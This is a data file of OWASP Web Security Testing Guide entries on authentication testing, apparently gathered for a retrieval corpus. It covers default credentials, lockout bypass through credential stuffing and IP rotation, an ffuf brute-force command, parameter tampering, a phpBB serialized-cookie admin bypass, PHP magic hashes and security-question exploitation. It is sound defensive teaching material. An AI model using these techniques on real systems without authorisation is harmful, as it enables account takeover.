- title: WSTG-ATHN-02 Testing for Default Credentials
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-02 — Testing for Default Credentials

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-02) — CC BY-SA 4.0

    Many web applications and hardware devices have default passwords for the built-in administrative account. Although in some cases these can be randomly generated, they are often static, meaning that they can be easily guessed or obtained by an attacker.

    ### Test Objectives

    - Determine whether the application has any user accounts with default passwords.
    - Review whether new user accounts are created with weak or predictable passwords.

    ### How to Test

    ### Testing for Vendor Default Credentials

    The first step to identifying default passwords is to identify the software that is in use. This is covered in detail in the [Information Gathering](../01-Information_Gathering/README.md) section of the guide.

    Once the software has been identified, try to find whether it uses default passwords, and if so, what they are. This should include:

    - Searching for "[SOFTWARE] default password".
    - Reviewing the manual or vendor documentation.
    - Checking common default password databases, such as [CIRT.net](https://cirt.net/passwords), [SecLists Default Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) or [DefaultCreds-cheat-sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv).
    - Inspecting the application source code (if available).
    - Installing the application on a virtual machine and inspecting it.
    - Inspecting the physical hardware for stickers (often present on network devices).

    If a default password can't be found, try common options such as:

    - "admin", "password", "12345", or other [common default passwords](https://github.com/nixawk/fuzzdb/blob/master/bruteforce/passwds/default_devices_users%2Bpasswords.txt).
    - An empty or blank password.
    - The serial number or MAC address of the device.

    If the username is unknown, there are various options for enumerating users, discussed in the [Testing for Account Enumeration](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md) guide. Alternatively, try common options such as "admin", "root", or "system".

    ### Testing for Organization Default Passwords

    When staff within an organization manually create passwords for new accounts, they may do so in a predictable way. This can often be:

    - A single common password such as "Password1".
    - Organization specific details, such as the organization name or address.
    - Passwords that follow a simple pattern, such as "Monday123" if account is created on a Monday.

    These types of passwords are often difficult to identify from a black-box perspective, unless they can successfully be guessed or brute-forced. However, they are easy to identify when performing gray-box or white-box testing.

    ### Testing for Application Generated Default Passwords

    If the application automatically generates passwords for new user accounts, these may also be predictable. In order to test these, create multiple accounts on the application with similar details at the same time, and compare the passwords that are given for them.

    The passwords may be based on:

    - A single static string shared between accounts.
    - A hashed or obfuscated part of the account details, such as `md5($username)`.
    - A time-based algorithm.
    - A weak pseudo-random number generator (PRNG).

    This type of issue is often difficult to identify from a black-box perspective.
- title: WSTG-ATHN-03 Testing for Weak Lock Out Mechanism
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-03 — Testing for Weak Lock Out Mechanism

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-03) — CC BY-SA 4.0

    Account lockout mechanisms are used to mitigate brute force attacks. Some of the attacks that can be defeated by using lockout mechanism:

    ### Test Objectives

    - Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.
    - Evaluate the unlock mechanism's resistance to unauthorized account unlocking.

    ### How to Test

    ### Testing Credential Stuffing and Distributed Brute Force

    Credential stuffing uses previously leaked username and password pairs from data breaches to gain unauthorized access to accounts. Distributed brute force and password spraying send many authentication attempts from multiple IP addresses. Both can bypass lockout mechanisms that only count failures per IP.

    Many applications lock accounts based solely on repeated login attempts from a single IP address. Attackers avoid that control by spreading requests across botnets or rotating proxies.

    Verify whether the application uses account-based protections, not only IP-based restrictions, when handling these attacks.

    1. Obtain a controlled set of test accounts and credentials that you are authorized to use. For credential stuffing, use known username and password pairs. For distributed brute force or password spraying, use a password list against one or more test usernames.
    2. Send authentication requests with those credentials.
    3. Distribute the attempts across multiple IP addresses using proxies or VPN endpoints.
    4. Observe whether the application enforces account-based protections or only IP-based restrictions.
    5. Monitor responses for account lockout, CAPTCHA challenges, or rate limiting.

    Example authentication request:

    ```http
    POST /login HTTP/1.1
    Host: example.com
    Content-Type: application/x-www-form-urlencoded

    username=user1@example.com&password=Password123
    ```

    Example using ffuf to fuzz passwords against a single test account (distributed brute force or password spraying when combined with IP rotation):

    ```bash
    ffuf -w passwords.txt -X POST -d "username=test&password=FUZZ" -u https://example.com/login
    ```

    For credential stuffing, drive known username and password pairs with Burp Intruder, ZAP Fuzzer, Hydra, or a custom script that submits each pair and rotates source IPs.

    ### Lockout Mechanism

    To test the strength of lockout mechanisms, you will need access to an account that you are willing or can afford to lock. If you have only one account with which you can log on to the web application, perform this test at the end of your test plan to avoid losing testing time by being locked out.

    To evaluate the account lockout mechanism's ability to mitigate brute force password guessing, attempt an invalid log in by using the incorrect password a number of times, before using the correct password to verify that the account was locked out. An example test may be as follows:

    1. Attempt to log in with an incorrect password 3 times.
    2. Successfully log in with the correct password, thereby showing that the lockout mechanism doesn't trigger after 3 incorrect authentication attempts.
    3. Attempt to log in with an incorrect password 4 times.
    4. Successfully log in with the correct password, thereby showing that the lockout mechanism doesn't trigger after 4 incorrect authentication attempts.
    5. Attempt to log in with an incorrect password 5 times.
    6. Attempt to log in with the correct password. The application returns "Your account is locked out.", thereby confirming that the account is locked out after 5 incorrect authentication attempts.
    7. Attempt to log in with the correct password 5 minutes later. The application returns "Your account is locked out.", thereby showing that the lockout mechanism does not automatically unlock after 5 minutes.
    8. Attempt to log in with the correct password 10 minutes later. The application returns "Your account is locked out.", thereby showing that the lockout mechanism does not automatically unlock after 10 minutes.
    9. Successfully log in with the correct password 15 minutes later, thereby showing that the lockout mechanism automatically unlocks after a 10 to 15 minute period.

    #### Unique Lockout Mechanisms

    There are more unique implementations of lockout mechanisms in use that are still acceptable. One of which is AWS's [Cognito](https://docs.aws.amazon.com/cognito/latest/developerguide/authentication.html#authentication-flow-lockout-behavior). It uses a simple scaling algorithm that mitigates brute-force attacks while not enabling long-term denial-of-service attacks against the affected user. After 5 failed sign-in attempts with a password, the user is locked out for one second. The lockout duration doubles with each failed attempt, with a maximum of 15 minutes. Sign-in attempts made during the lockout period are exceptions referred to as `Password attempts exceeded`, and in most implementations are not returned to the user who initiated the sign-in. If they aren't shown to the user, a tester may think that no lockout mechanism is being used, as 200 rapid attempts to sign-in would generate a lot of the exceptions, and very few legitimate failed sign-in attempts.
      
    The math behind the mechanism is: `2^(n-5)`, with `n` being the number of failed sign-in attempts. The resulting number is the amount of seconds that the user is locked out. To reset the lockout count to zero, the user must sign-in successfully or wait the 15 minutes.

    To test for this using a fuzzing tool, such as Burp Suite's Intruder, navigate into the "Resource Pool". Then set the maximum concurrent requests to 1 and the delay between requests to 2 seconds. Attempt the invalid authentication 200 times, then attempt to use the valid credentials 3 times directly after the fuzzing tool finishes. Wait 2 minutes and attempt to sign-in. If sign-in is then successful, Cognito may be in use. Further testing can then be performed to validate the use of Cognito by attempting to push the lockout time higher, but it may be easier to validate this information with the client.

    A CAPTCHA may hinder brute force attacks, but they can come with their own set of weaknesses, and should not replace a lockout mechanism. A CAPTCHA mechanism may be bypassed if implemented incorrectly. CAPTCHA flaws include:

    1. Easily defeated challenge, such as arithmetic or limited question set.
    2. CAPTCHA checks for HTTP response code instead of response success.
    3

    _(truncated — see the full WSTG test)_
- title: WSTG-ATHN-04 Testing for Bypassing Authentication Schema
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-04 — Testing for Bypassing Authentication Schema

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-04) — CC BY-SA 4.0

    In computer security, authentication is the process of attempting to verify the digital identity of the sender of a communication. A common example of such a process is the log on process. Testing the authentication schema means understanding how the authentication process works and using that information to circumvent the authentication mechanism.

    ### Test Objectives

    - Ensure that authentication is applied across all services that require it.

    ### How to Test

    There are several methods of bypassing the authentication schema that is used by a web application:

    - Parameter modification
    - Session ID prediction
    - SQL injection

    ### Parameter Modification

    Another problem related to authentication design is when the application verifies a successful log in on the basis of a fixed value parameters. A user could modify these parameters to gain access to the protected areas without providing valid credentials. In the example below, the "authenticated" parameter is changed to a value of "yes", which allows the user to gain access. In this example, the parameter is in the URL, but a proxy could also be used to modify the parameter, especially when the parameters are sent as form elements in a POST request or when the parameters are stored in a cookie.

    ```html
    https://www.site.com/page.asp?authenticated=no

    raven@blackbox /home $nc www.site.com 80
    GET /page.asp?authenticated=yes HTTP/1.0

    HTTP/1.1 200 OK
    Date: Sat, 11 Nov 2006 10:22:44 GMT
    Server: Apache
    Connection: close
    Content-Type: text/html; charset=iso-8859-1

    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <HTML><HEAD>
    </HEAD><BODY>
    <H1>You Are Authenticated</H1>
    </BODY></HTML>
    ```

    ![Parameter Modified Request](images/Basm-parammod.jpg)\
    *Figure 4.4.4-1: Parameter Modified Request*

    ### Session ID Prediction

    Many web applications manage authentication by using session identifiers (session IDs). Therefore, if session ID generation is predictable, a malicious user could be able to find a valid session ID and gain unauthorized access to the application, impersonating a previously authenticated user.

    In the following figure, values inside cookies increase linearly, so it could be easy for an attacker to guess a valid session ID.

    ![Cookie Values Over Time](images/Basm-sessid.jpg)\
    *Figure 4.4.4-2: Cookie Values Over Time*

    In the following figure, values inside cookies change only partially, so it's possible to restrict a brute force attack to the defined fields shown below.

    ![Partially Changed Cookie Values](images/Basm-sessid2.jpg)\
    *Figure 4.4.4-3: Partially Changed Cookie Values*

    ### SQL Injection (HTML Form Authentication)

    SQL Injection is a widely known attack technique. This section is not going to describe this technique in detail as there are several sections in this guide that explain injection techniques beyond the scope of this section.

    ![SQL Injection](images/Basm-sqlinj.jpg)\
    *Figure 4.4.4-4: SQL Injection*

    The following figure shows that with a simple SQL injection attack, it is sometimes possible to bypass the authentication form.

    ![Simple SQL Injection Attack](images/Basm-sqlinj2.gif)\
    *Figure 4.4.4-5: Simple SQL Injection Attack*

    ### PHP Loose Comparison

    If an attacker has been able to retrieve the application source code by exploiting a previously discovered vulnerability (e.g., directory traversal), or from a web repository (Open Source Applications), it could be possible to perform refined attacks against the implementation of the authentication process.

    In the following example (PHPBB 2.0.12 - Authentication Bypass Vulnerability), at line 2 the `unserialize()` function parses a user supplied cookie and sets values inside the `$sessiondata` array. At line 7, the user's MD5 password hash stored inside the backend database (`$auto_login_key`) is compared to the one supplied (`$sessiondata['autologinid']`) by the user.

    ```php
    1. if (isset($HTTP_COOKIE_VARS[$cookiename . '_sid'])) {
    2.     $sessiondata = isset($HTTP_COOKIE_VARS[$cookiename . '_data']) ? unserialize(stripslashes($HTTP_COOKIE_VARS[$cookiename . '_data'])) : array();
    3.     $sessionmethod = SESSION_METHOD_COOKIE;
    4. }
    5. $auto_login_key = $userdata['user_password'];
    6. // We have to login automagically
    7. if( $sessiondata['autologinid'] == $auto_login_key )
    8. {
    9.     // autologinid matches password
    10.     $login = 1;
    11.     $enable_autologin = 1;
    12. }

    ```

    In PHP, a comparison between a string value and a `true` boolean value is always `true` (because the string contains a value), so by supplying the following string to the `unserialize()` function, it is possible to bypass the authentication control and log in as administrator, whose `userid` is 2:

    ```php
    a:2:{s:11:"autologinid";b:1;s:6:"userid";s:1:"2";}  // original value: a:2:{s:11:"autologinid";s:32:"8b8e9715d12e4ca12c4c3eb4865aaf6a";s:6:"userid";s:4:"1337";}
    ```

    Let's disassemble what we did in this string:

    1. `autologinid` is now a boolean set to `true`: this can be seen by replacing the MD5 value of the password hash (`s:32:"8b8e9715d12e4ca12c4c3eb4865aaf6a"`) with `b:1`
    2. `userid` is now set to the admin ID: this can be seen in the last piece of the string, where we replaced our regular user ID (`s:4:"1337"`) with `s:1:"2"`

    ### PHP Magic Hashes

    A similar issue can occur in PHP when hashes are loosely compared, and end up being evaluated as numbers.

    PHP supports the use of [scientific notation](https://en.wikipedia.org/wiki/Scientific_notation) for numbers, so the number `2e4` is treated as "two times ten to the power of four", which equals 20,000. Similarly, a number such as `0e4` would be "zero times ten to the power of four", which equals zero. Because zero times anything is zero, this means that a comparison such as `0e2 == 0e3` would evaluate to true, because both sides equal zero.

    This can be exploitable where two password hashes are compared, and both of them are in the form of string of zeros, the letter "e", and then a string of numbers. Consider the following code:

    ```php
    <?php
    {
        if (md5('240610708') == md5('QLTHNDT')) {
            print("Passwords match");
        } else {
            print("Passwords are different");
        }                                                                           
    }
    ```

    The two passwords are clearly different, but since they both hash to strings that equal zero in scientific notation ("0e462097431906509019562988736854" and "0e405967825401955372549139051580" respectively), the comparison will r

    _(truncated — see the full WSTG test)_
- title: WSTG-ATHN-05 Testing for Vulnerable Remember Password
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-05 — Testing for Vulnerable Remember Password

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-05) — CC BY-SA 4.0

    Credentials are the most widely used authentication technology. Due to such a wide usage of username-password pairs, users are no longer able to properly handle their credentials across the multitude of used applications.

    ### Test Objectives

    - Validate that the generated session is managed securely and do not put the user's credentials in danger.

    ### How to Test

    As these methods provide a better user experience and allow the user to forget all about their credentials, they increase the attack surface area. Some applications:

    - Store the credentials in an encoded fashion in the browser's storage mechanisms, which can be verified by following the [web storage testing scenario](../11-Client-side_Testing/12-Testing_Browser_Storage.md) and going through the [session analysis](../06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md#session-analysis) scenarios. Credentials shouldn't be stored in any way in the client-side application, and should be substituted by tokens generated server-side.
    - Automatically inject the user's credentials that can be abused by:
        - [ClickJacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md) attacks.
        - [CSRF](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md) attacks.
    - Tokens should be analyzed in terms of token-lifetime, where some tokens never expire and put the users in danger if those tokens ever get stolen. Make sure to follow the [session timeout](../06-Session_Management_Testing/07-Testing_Session_Timeout.md) testing scenario.
- title: WSTG-ATHN-06 Testing for Browser Cache Weaknesses
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-06 — Testing for Browser Cache Weaknesses

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-06) — CC BY-SA 4.0

    In this phase the tester checks that the application correctly instructs the browser to not retain sensitive data.

    ### Test Objectives

    - Review if the application stores sensitive information on the client-side.
    - Review if access can occur without authorization.

    ### How to Test

    ### Browser History

    Technically, the **Back** button is a history and not a cache (see [Caching in HTTP: History Lists](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html#sec13.13)). The cache and the history are two different entities. However, they share the same weakness of presenting previously displayed sensitive information.

    The first and simplest test consists of entering sensitive information into the application and logging out. Then the tester clicks the **Back** button of the browser to check whether previously displayed sensitive information can be accessed whilst unauthenticated.

    If by pressing the **Back** button the tester can access previous pages but not access new ones, then it is not an authentication issue, but a browser history issue. If these pages contain sensitive data, it means that the application did not forbid the browser from storing it.

    Authentication does not necessarily need to be involved in the testing. For example, when a user enters their email address in order to sign up to a newsletter, this information could be retrievable if not properly handled.

    The **Back** button can be stopped from showing sensitive data. This can be done by:

    - Delivering the page over HTTPS.
    - Setting `Cache-Control: no-store`

    `Cache-Control: no-store` instructs the browser not to store the response in any cache or history storage, which helps prevent sensitive data from being accessible when users navigate back after logging out.

    ### Browser Cache

    Here testers check that the application does not leak any sensitive data into the browser cache. In order to do that, they can use a proxy (such as ZAP) and search through the server responses that belong to the session, checking that for every page that contains sensitive information the server instructed the browser not to cache any data. Such a directive can be issued in the HTTP response headers with the following directives:

    - `Cache-Control: no-store`

    When `Cache-Control: no-store` is used, additional directives such as `must-revalidate`, `max-age`, or the `Expires` header are generally unnecessary for modern browsers.

    ```http
    HTTP/1.1
    Cache-Control: no-store
    ```

    For instance, if testers are testing an e-commerce application, they should look for all pages that contain a credit card number or some other financial information, and check that all those pages enforce the `no-store` directive. If they find pages that contain critical information but that fail to instruct the browser not to cache their content, they know that sensitive information will be stored on the disk, and they can double-check this simply by looking for the page in the browser cache.

    The exact location where that information is stored depends on the client operating system and on the browser that has been used. Here are some examples:

    - Mozilla Firefox:
        - Unix/Linux: `~/.cache/mozilla/firefox/`
        - Windows: `C:\Users\<user_name>\AppData\Local\Mozilla\Firefox\Profiles\<profile-id>\Cache2\`
    - Internet Explorer:
        - `C:\Users\<user_name>\AppData\Local\Microsoft\Windows\INetCache\`
    - Chrome:
        - Windows: `C:\Users\<user_name>\AppData\Local\Google\Chrome\User Data\Default\Cache`
        - Unix/Linux: `~/.cache/google-chrome`

    #### Reviewing Cached Information

    Firefox provides functionality for viewing cached information, which may be to your benefit as a tester. Of course the industry has also produced various extensions, and external apps which you may prefer or need for Chrome, Internet Explorer, or Edge.

    Cache details are also available via developer tools in most modern browsers, such as [Firefox](https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector#Cache_Storage), [Chrome](https://developers.google.com/web/tools/chrome-devtools/storage/cache), and Edge. With Firefox it is also possible to use the URL `about:cache` to check cache details.

    #### Check Handling for Mobile Browsers

    Handling of cache directives may be completely different for mobile browsers. Therefore, testers should start a new browsing session with clean caches and take advantage of features like Chrome's [Device Mode](https://developers.google.com/web/tools/chrome-devtools/device-mode) or Firefox's [Responsive Design Mode](https://developer.mozilla.org/en-US/docs/Tools/Responsive_Design_Mode) to re-test or separately test the concepts outlined above.

    Additionally, personal proxies such as ZAP and Burp Suite allow the tester to specify which `User-Agent` should be sent by their spiders/crawlers. This could be set to match a mobile browser `User-Agent` string and used to see which caching directives are sent by the application being tested.

    ### Gray-Box Testing

    The methodology for testing is equivalent to the black-box case, as in both scenarios testers have full access to the server response headers and to the HTML code. However, with gray-box testing, the tester may have access to account credentials that will allow them to test sensitive pages that are accessible only to authenticated users.
- title: WSTG-ATHN-07 Testing for Weak Authentication Methods
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-07 — Testing for Weak Authentication Methods

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-07) — CC BY-SA 4.0

    The most prevalent and most easily administered authentication mechanism is a static password. The password represents the keys to the kingdom, but is often subverted by users in the name of usability. In each of the recent high profile hacks that have revealed user credentials, it is lamented that most common passwords are still: `123456`, `password` and `qwerty`.

    ### Test Objectives

    - Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.

    ### How to Test

    1. What characters are permitted and forbidden for use within a password? Is the user required to use characters from different character sets such as lower and uppercase letters, digits and special symbols?
    2. How often can a user change their password? How quickly can a user change their password after a previous change? Users may bypass password history requirements by changing their password 5 times in a row so that after the last password change they have configured their initial password again.
    3. When must a user change their password?
        - Both [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecretver) and [NCSC](https://www.ncsc.gov.uk/collection/passwords/updating-your-approach#PasswordGuidance:UpdatingYourApproach-Don'tenforceregularpasswordexpiry) recommend **against** forcing regular password expiry, although it may be required by standards such as PCI DSS.
    4. How often can a user reuse a password? Does the application maintain a history of the user's previous used 8 passwords?
    5. How different must the next password be from the last password?
    6. Is the user prevented from using his username or other account information (such as first or last name) in the password?
    7. What are the minimum and maximum password lengths that can be set, and are they appropriate for the sensitivity of the account and application?
    8. Is it possible to set common passwords such as `Password1` or `123456`?
    9. Is the credential chosen for the user by the application, such as a social security number or a birthdate? Is the credential that's utilized in lieu of a standard password easily obtainable, predictable, or susceptible to brute-force attacks?
- title: WSTG-ATHN-08 Testing for Weak Security Question Answer
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-08 — Testing for Weak Security Question Answer

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-08) — CC BY-SA 4.0

    Often called "secret" questions and answers, security questions and answers are often used to recover forgotten passwords (see [Testing for weak password change or reset functionalities](09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md), or as extra security on top of the password.

    ### Test Objectives

    - Determine the complexity and how straight-forward the questions are.
    - Assess possible user answers and brute force capabilities.

    ### How to Test

    ### Testing for Weak Pre-generated Questions

    Try to obtain a list of security questions by creating a new account or by following the "I don’t remember my password"-process. Try to generate as many questions as possible to get a good idea of the type of security questions that are asked. If any of the security questions fall in the categories described above, they are vulnerable to being attacked (guessed, brute-forced, available on social media, etc.).

    ### Testing for Weak Self-Generated Questions

    Try to create security questions by creating a new account or by configuring your existing account’s password recovery properties. If the system allows the user to generate their own security questions, it is vulnerable to having insecure questions created. If the system uses the self-generated security questions during the forgotten password functionality and if usernames can be enumerated (see [Testing for Account Enumeration and Guessable User Account](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md), then it should be easy for the tester to enumerate a number of self-generated questions. It should be expected to find several weak self-generated questions using this method.

    ### Testing for Brute-forcible Answers

    Use the methods described in [Testing for Weak lock out mechanism](03-Testing_for_Weak_Lock_Out_Mechanism.md) to determine if a number of incorrectly supplied security answers trigger a lockout mechanism.

    The first thing to take into consideration when trying to exploit security questions is the number of questions that need to be answered. The majority of applications only need the user to answer a single question, whereas some critical applications may require the user to answer two or even more questions.

    The next step is to assess the strength of the security questions. Could the answers be obtained by a simple Google search or with social engineering attack? As a penetration tester, here is a step-by-step walkthrough of exploiting a security question scheme:

    - Does the application allow the end user to choose the question that needs to be answered? If so, focus on questions which have:

        - A "public" answer; for example, something that could be find with a simple search-engine query.
        - A factual answer such as a "first school" or other facts which can be looked up.
        - Few possible answers, such as "what model was your first car". These questions would present the attacker with a short list of possible answers, and based on statistics the attacker could rank answers from most to least likely.

    - Determine how many guesses you have if possible.
        - Does the password reset allow unlimited attempts?
        - Is there a lockout period after X incorrect answers? Keep in mind that a lockout system can be a security problem in itself, as it can be exploited by an attacker to launch a Denial of Service against legitimate users.
        - Pick the appropriate question based on analysis from the above points, and do research to determine the most likely answers.

    The key to successfully exploiting and bypassing a weak security question scheme is to find a question or set of questions which give the possibility of easily finding the answers. Always look for questions which can give you the greatest statistical chance of guessing the correct answer, if you are completely unsure of any of the answers. In the end, a security question scheme is only as strong as the weakest question.
- title: WSTG-ATHN-09 Testing for Weak Password Change or Reset Functionalities
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-09 — Testing for Weak Password Change or Reset Functionalities

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-09) — CC BY-SA 4.0

    For any application that requires the user to authenticate with a password, there must be a mechanism by which the user can regain access to their account if they forget their password. Although this can sometimes be a manual process that involves contacting the owner of the website or a support team, users are frequently allowed to carry out a self-service password reset, and to regain access to their account by providing some other evidence of their identity.

    ### Test Objectives

    - Determine whether the password change and reset functionality allows accounts to be compromised.

    ### How to Test

    ### Information Gathering

    The first step is to gather information about what mechanisms are available to allow the user to reset their password on the application. If there are multiple interfaces on the same site (such as a web interface, mobile application, and API) then these should all be reviewed, in case they provide different functionality.

    Once this has been established, determine what information is required in order for a user to initiate a password reset. This can be the username or email address (both of which may be obtained from public information), but it could also be an internally-generated user ID.

    ### General Concerns

    Regardless of the specific methods used to reset passwords, there are a number of common areas that need to be considered:

    - Is the password reset process weaker than the authentication process?

      The password reset process provides an alternative mechanism to access a user's account, and so should be at least as secure as the usual authentication process. However, it can provide an easier way to compromise the account, especially if it uses weaker authentication factors such as security questions.

      Additionally, the password reset process may bypass the requirement to use Multi-Factor Authentication (MFA), which can substantially reduce the security of the application.

    - Is there rate limiting or other protection against automated attacks?

      As with any authentication mechanism, the password reset process should have protection against automated or brute-force attacks. There are a variety of different methods that can be used to achieve this, such as rate limiting or the use of CAPTCHA. These are particularly important on functionality that triggers external actions (such as sending an email or SMS), or when the user is entering a password reset token.

      It is also possible to protect against brute-force attacks by locking out the account from the password reset process after a certain number of consecutive attempts. This could also prevent a legitimate user from being able to reset their password and regain access to their account, however.

    - Is it vulnerable to common attacks?

      As well as the specific areas discussed in this guide, it's also important to check for other common vulnerabilities such as SQL injection or cross-site scripting.

    - Does the reset process allow user enumeration?

      See the [Testing for Account Enumeration](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md) guide for further information.

    ### Email - New Password Sent

    In this model, the user is sent a new password via email once they have proved their identity. This is considered less secure for two main reasons:

    - The password is sent to the user in an unencrypted form.
    - The password for the account is changed when the request is made, effectively locking the user out of their account until they receive the email. By making repeated requests, it is possible to prevent a user from being able to access their account.

    Where this approach is used, the following areas should be reviewed:

    - Is the user forced to change the password on initial login?

      The new password is sent over unencrypted email, and may sit in the user's inbox indefinitely if they don't delete the email. As such, the user should be required to change the password as soon as they log in for the first time.

    - Is the password securely generated?

      The password should be generated using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long to prevent password guessing or brute-force attacks. For a secure user-friendly experience, it should be generated using a secure passphrase-style approach (i.e, combining multiple words), rather than a string of random characters.

    - Is the user's existing password sent to them?

      Rather than generating a new password for the user, some applications will send the user their existing password. This is a very insecure approach, as it exposes their current password over unencrypted email. Additionally, if the site is able to recover the existing password, this implies that passwords are either stored using reversible encryption, or (more likely) in unencrypted plain text, both of which represent a serious security weakness.

    - Are the emails sent from a domain with anti-spoofing protection?

      The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.

    - Is email considered sufficiently secure?

      Emails are typically sent unencrypted, and in many cases the user's email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.

      Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.

    ### Email - Link Sent

    In this model, the user is emailed a link that contains a token. They can then click this link, and are prompted to enter a new password on the site. This is the most common approach used for password reset, but is more complex to implement than the previously discussed approach. The key areas to test are:

    - Does the link use HTTPS?

      If the token is sent over unencrypted HTTP, it may be possible for an attacker to intercept it.

    - Can the link be used multiple times?

      Links should expire after they are used, otherwise they provide a persistent backdoor for the account.

    - Does the link expire if it remains unused?

      Links should be time limited. Exactly how long is appropriate will depend on the site, but it should rarely be more than an hour.

    - Is the token sufficiently long and random?

      The security of the process is entirely reliant on an attacker not being able to guess or brute-force a token. The tokens should be generated with a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and s

    _(truncated — see the full WSTG test)_
- title: WSTG-ATHN-10 Testing for Weaker Authentication in Alternative Channel
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-10 — Testing for Weaker Authentication in Alternative Channel

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-10) — CC BY-SA 4.0

    Even if the primary authentication mechanisms do not include any vulnerabilities, it may be that vulnerabilities exist in alternative legitimate authentication user channels for the same user accounts. Tests should be undertaken to identify alternative channels and, subject to test scoping, identify vulnerabilities.

    ### Test Objectives

    - Identify alternative authentication channels.
    - Assess the security measures used and if any bypasses exists on the alternative channels.

    ### How to Test

    ### Understand the Primary Mechanism

    Fully test the website's primary authentication functions. This should identify how accounts are issued, created or changed and how passwords are recovered, reset, or changed. Additionally knowledge of any elevated privilege authentication and authentication protection measures should be known. These precursors are necessary to be able to compare with any alternative channels.

    ### Identify Other Channels

    Other channels can be found by using the following methods:

    - Reading site content, especially the home page, contact us, help pages, support articles and FAQs, T&Cs, privacy notices, the robots.txt file and any sitemap.xml files.
    - Searching HTTP proxy logs, recorded during previous information gathering and testing, for strings such as "mobile", "Android", blackberry", "ipad", "iphone", "mobile app", "e-reader", "wireless", "auth", "sso", "single sign on" in URL paths and body content.
    - Use search engines to find different websites from the same organization, or using the same domain name, that have similar home page content or which also have authentication mechanisms.

    For each possible channel confirm whether user accounts are shared across these, or provide access to the same or similar functionality.

    ### Enumerate Authentication Functionality

    For each alternative channel where user accounts or functionality are shared, identify if all the authentication functions of the primary channel are available, and if anything extra exists. It may be useful to create a grid like the one below:

      | Primary | Mobile  |  Call Center | Partner Website |
      |---------|---------|--------------|-----------------|
      | Register| Yes     |     -        |       -         |
      | Log in  | Yes     |    Yes       |    Yes(SSO)     |
      | Log out |   -     |     -        |       -         |
      |Password reset |   Yes  |   Yes   |       -         |
      | -       | Change password |   -  |       -         |

    In this example, mobile has an extra function "change password" but does not offer "log out". A limited number of tasks are also possible by phoning the call center. Call centers can be interesting, because their identity confirmation checks might be weaker than the website's, allowing this channel to be used to aid an attack against a user's account.

    While enumerating these it is worth taking note of how session management is undertaken, in case there is overlap across any channels (e.g. cookies scoped to the same parent domain name, concurrent sessions allowed across channels, but not on the same channel).

    ### Review and Test

    Alternative channels should be mentioned in the testing report, even if they are marked as "information only" or "out of scope". In some cases the test scope might include the alternative channel (e.g. because it is just another path on the target hostname), or may be added to the scope after discussion with the owners of all the channels. If testing is permitted and authorized, all the other authentication tests in this guide should then be performed, and compared against the primary channel.
- title: WSTG-ATHN-11 Testing Multi-Factor Authentication (MFA)
  service: http
  tech: auth
  doc_kind: wstg
  content: |-
    ## WSTG-ATHN-11 — Testing Multi-Factor Authentication (MFA)

    Category: 04-Authentication_Testing  
    Source: OWASP WSTG (WSTG-ATHN-11) — CC BY-SA 4.0

    Many applications implement Multi-Factor Authentication (MFA) as an additional layer of security to protect the login process. This is also known as two-factor authentication (2FA) or two-step verification (2SV) - although these are not strictly the same thing. MFA means asking the user to provide *at least* two different [authentication factors](#types-of-mfa) when logging in.

    ### Test Objectives

    - Identify the type of MFA used by the application.
    - Determine whether the MFA implementation is robust and secure.
    - Attempt to bypass the MFA.

    ### How to Test

    ### Types of MFA

    MFA means that *at least* two of the following factors are required to authentication:

    | Factor | Examples |
    |--------|----------|
    | Something You Know | Passwords, PINs and security questions. |
    | Something You Have | Hardware or software tokens, certificates, email*, SMS, and phone calls. |
    | Something You Are | Fingerprints, facial recognition, iris scans, handprint scans and behavioural factors. |
    | Location | Source IP ranges, and geolocation. |

    \* Email only really constitutes "something you have" if the email account itself is protected with MFA. As such, it should be considered weaker than other alternatives such as certificates or TOTP, and may not be accepted as MFA under some definitions.

